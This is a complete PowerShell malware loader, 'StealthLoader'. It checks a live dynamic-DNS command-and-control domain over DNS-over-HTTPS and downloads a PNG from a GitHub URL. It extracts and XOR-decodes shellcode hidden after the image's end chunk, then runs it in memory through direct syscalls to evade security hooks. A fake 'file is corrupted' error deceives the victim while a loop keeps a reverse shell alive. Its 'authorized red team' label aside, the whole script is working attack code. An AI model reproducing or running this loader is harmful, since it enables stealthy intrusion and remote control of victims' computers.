<#
.SYNOPSIS
    StealthLoader - Advanced Reflective Loader with Direct Syscalls & Steganography
    
.DESCRIPTION
    Demonstrates advanced evasion techniques:
    1. Direct System Calls (Bypassing User-mode API Hooks)
    2. Steganography (Extracting payload from PNG)
    3. DoH (DNS-over-HTTPS) for C2 signaling
    
.NOTES
    Author: APT313 Simulation
    Warning: For authorized Red Team engagements only.
#>

param(
    [string]$ImageUrl = "https://raw.githubusercontent.com/rootcpanel-yoe/313/main/evil.png",
    [string]$DohProvider = "https://cloudflare-dns.com/dns-query",
    [string]$C2Domain = "bib0rn.myvnc.com"
)

# ============================================================================
# 1. C# KERNEL BRIDGE (DIRECT SYSCALLS)
# ============================================================================
$KernelBridgeCode = @"
using System;
using System.Runtime.InteropServices;
using System.ComponentModel;

public class SyscallBridge {
    
    [DllImport("kernel32.dll")] public static extern IntPtr GetModuleHandle(string lpModuleName);
    [DllImport("kernel32.dll")] public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
    [DllImport("kernel32.dll")] static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    
    // Delegates for Syscalls
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtAllocateVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        IntPtr ZeroBits,
        ref IntPtr RegionSize,
        uint AllocationType,
        uint Protect
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtProtectVirtualMemory(
        IntPtr ProcessHandle,
        ref IntPtr BaseAddress,
        ref IntPtr RegionSize,
        uint NewProtect,
        out uint OldProtect
    );

    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    public delegate uint NtCreateThreadEx(
        out IntPtr threadHandle,
        uint desiredAccess,
        IntPtr objectAttributes,
        IntPtr processHandle,
        IntPtr startAddress,
        IntPtr parameter,
        bool createSuspended,
        int stackZeroBits,
        int sizeOfStackCommit,
        int sizeOfStackReserve,
        IntPtr bytesBuffer
    );

    // Win32 Constants
    public const uint MEM_COMMIT = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_EXECUTE_READ = 0x20;
    public const uint PAGE_READWRITE = 0x04;

    // Dynamic SSN Resolution (Simple Pattern Match)
    public static int GetSSN(string funcName) {
        IntPtr hNtdll = GetModuleHandle("ntdll.dll");
        if (hNtdll == IntPtr.Zero) return -1;

        IntPtr pFunc = GetProcAddress(hNtdll, funcName);
        if (pFunc == IntPtr.Zero) return -1;

        byte[] bytes = new byte[5];
        Marshal.Copy(pFunc, bytes, 0, 5);

        // Check for 'mov r10, rcx; mov eax, SSN' (4C 8B D1 B8 XX)
        if (bytes[0] == 0x4C && bytes[1] == 0x8B && bytes[2] == 0xD1 && bytes[3] == 0xB8) {
            return bytes[4];
        }
        return -1; // Hooked or failed
    }

    public static byte[] GetSyscallStub(int ssn) {
        return new byte[] {
            0x4C, 0x8B, 0xD1,               // mov r10, rcx
            0xB8, (byte)ssn, 0x00, 0x00, 0x00, // mov eax, SSN
            0x0F, 0x05,                     // syscall
            0xC3                            // ret
        };
    }

    // Execute Shellcode via Direct Syscall
    public static void Execute(byte[] shellcode) {
        // Resolve SSNs dynamically
        int ssnAlloc = GetSSN("NtAllocateVirtualMemory");
        int ssnProtect = GetSSN("NtProtectVirtualMemory");
        int ssnCreate = GetSSN("NtCreateThreadEx");

        if (ssnAlloc == -1 || ssnProtect == -1 || ssnCreate == -1) 
            throw new Exception("Failed to resolve SSNs (Hooked or Invalid).");

        IntPtr hProcess = (IntPtr)(-1); // Current Process
        IntPtr baseAddress = IntPtr.Zero;
        IntPtr regionSize = (IntPtr)shellcode.Length;

        byte[] allocStub = GetSyscallStub(ssnAlloc);
        byte[] protectStub = GetSyscallStub(ssnProtect);
        byte[] createStub = GetSyscallStub(ssnCreate);

        GCHandle hAllocStub = GCHandle.Alloc(allocStub, GCHandleType.Pinned);
        GCHandle hProtectStub = GCHandle.Alloc(protectStub, GCHandleType.Pinned);
        GCHandle hCreateStub = GCHandle.Alloc(createStub, GCHandleType.Pinned);

        uint oldProtect;
        VirtualProtect(hAllocStub.AddrOfPinnedObject(), (UIntPtr)allocStub.Length, 0x40, out oldProtect);
        VirtualProtect(hProtectStub.AddrOfPinnedObject(), (UIntPtr)protectStub.Length, 0x40, out oldProtect);
        VirtualProtect(hCreateStub.AddrOfPinnedObject(), (UIntPtr)createStub.Length, 0x40, out oldProtect);

        var sysAlloc = (NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(hAllocStub.AddrOfPinnedObject(), typeof(NtAllocateVirtualMemory));
        var sysProtect = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(hProtectStub.AddrOfPinnedObject(), typeof(NtProtectVirtualMemory));
        var sysCreate = (NtCreateThreadEx)Marshal.GetDelegateForFunctionPointer(hCreateStub.AddrOfPinnedObject(), typeof(NtCreateThreadEx));

        // 1. Allocate Memory as RW (Read-Write) - Better OpSec than RWX
        uint status = sysAlloc(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (status != 0) throw new Exception("Syscall NtAllocateVirtualMemory failed: " + status);

        // 2. Copy Shellcode
        Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

        // 3. Change Protection to RX (Read-Execute)
        status = sysProtect(hProcess, ref baseAddress, ref regionSize, PAGE_EXECUTE_READ, out oldProtect);
        if (status != 0) throw new Exception("Syscall NtProtectVirtualMemory failed: " + status);

        // 4. Execute via Syscall
        IntPtr hThread = IntPtr.Zero;
        status = sysCreate(out hThread, 0x1FFFFF, IntPtr.Zero, hProcess, baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        if (status != 0) throw new Exception("Syscall NtCreateThreadEx failed: " + status);
    }
}
"@

if (-not ([System.Management.Automation.PSTypeName]'SyscallBridge').Type) {
    try {
        Add-Type -TypeDefinition $KernelBridgeCode -Language CSharp
        Write-Host "[+] Kernel Bridge loaded successfully." -ForegroundColor Green
    } catch {
        Write-Error "[-] Failed to load Kernel Bridge: $_"
        exit
    }
} else {
    Write-Host "[*] Kernel Bridge already loaded." -ForegroundColor Gray
}

# ============================================================================
# 2. STEGANOGRAPHY MODULE
# ============================================================================
function Get-PayloadFromPng {
    param([string]$Path)
    
    Write-Host "[*] Analyzing PNG steganography..." -ForegroundColor Cyan
    
    # Simple Steganography: Payload appended after IEND chunk
    # A real implementation would use LSB (Least Significant Bit) encoding
    
    $bytes = [System.IO.File]::ReadAllBytes($Path)
    $hex = [System.BitConverter]::ToString($bytes) -replace '-'
    
    # Find PNG IEND chunk (49 45 4E 44 AE 42 60 82)
    $iendSignature = "49454E44AE426082"
    $split = $hex -split $iendSignature
    
    if ($split.Count -gt 1 -and $split[1].Length -gt 0) {
        Write-Host "[+] Hidden data found after IEND chunk!" -ForegroundColor Green
        
        # Convert remaining hex back to bytes
        $payloadHex = $split[1]
        if ($payloadHex.Length % 2 -ne 0) { $payloadHex = $payloadHex.Substring(0, $payloadHex.Length - 1) }
        
        $payloadBytes = New-Object byte[] ($payloadHex.Length / 2)
        for ($i = 0; $i -lt $payloadHex.Length; $i += 2) {
            $payloadBytes[$i / 2] = [Convert]::ToByte($payloadHex.Substring($i, 2), 16)
        }
        
        # Decrypt (XOR stub for demo)
        $key = 0xAA
        for ($i = 0; $i -lt $payloadBytes.Length; $i++) {
            $payloadBytes[$i] = $payloadBytes[$i] -bxor $key
        }
        
        return $payloadBytes
    }
    
    Write-Warning "[-] No hidden data found in PNG."
    return $null
}

# ============================================================================
# 3. DNS-OVER-HTTPS (DoH) C2 CHANNEL
# ============================================================================
function Invoke-DoHQuery {
    param([string]$Domain, [string]$Type="TXT")
    
    Write-Host "[*] Querying DoH: $Domain ($Type)" -ForegroundColor Cyan
    
    try {
        $url = "https://cloudflare-dns.com/dns-query?name=$Domain&type=$Type"
        $response = Invoke-RestMethod -Uri $url -Headers @{ "Accept" = "application/dns-json" }
        
        if ($response.Answer) {
            $data = $response.Answer.data -replace '"',''
            Write-Host "[+] DoH Response: $data" -ForegroundColor Green
            return $data
        }
    } catch {
        Write-Error "[-] DoH Query failed: $_"
    }
    return $null
}

# ============================================================================
# MAIN EXECUTION FLOW
# ============================================================================

Write-Host "=== STEALTH LOADER v1.0 ===" -ForegroundColor Magenta

# 1. Check C2 via DoH
# We query an A record (IP) to trigger execution (since free DynDNS often blocks TXT)
$c2Instruction = Invoke-DoHQuery -Domain $C2Domain -Type "A"

if ($c2Instruction -match "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}") {
    
    # 2. Download Stego Image
    $imagePath = "$env:TEMP\cache_$(Get-Random).png"
    Write-Host "[*] Downloading carrier image..." -ForegroundColor Cyan
    try {
        Invoke-WebRequest -Uri $ImageUrl -OutFile $imagePath -ErrorAction Stop
    } catch {
        Write-Error "[-] Failed to download image: $_"
        exit
    }
    
    # 3. Extract & Execute
    $realPayload = Get-PayloadFromPng -Path $imagePath
    
    if ($realPayload) {
        Write-Host "[*] Preparing Direct System Calls..." -ForegroundColor Cyan
        try {
            [SyscallBridge]::Execute($realPayload)
            Write-Host "[+] Payload executed via Kernel Syscalls" -ForegroundColor Green
            
            # 4. Fake Error Message (Social Engineering)
            # Pops up AFTER payload injection. Blocks main thread until clicked, keeping process alive.
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show("The file is corrupted and cannot be opened.", "Document Error", 'OK', 'Error') | Out-Null
            
            # 5. Keep-Alive Loop (Ensures Reverse Shell thread doesn't die when script finishes)
            while($true) { Start-Sleep -Seconds 60 }
        } catch {
            Write-Error "[-] Execution failed: $_"
        }
    } else {
        Write-Error "[-] Failed to extract payload from PNG."
    }
} else {
    Write-Host "[*] No execution command received from C2." -ForegroundColor Yellow
}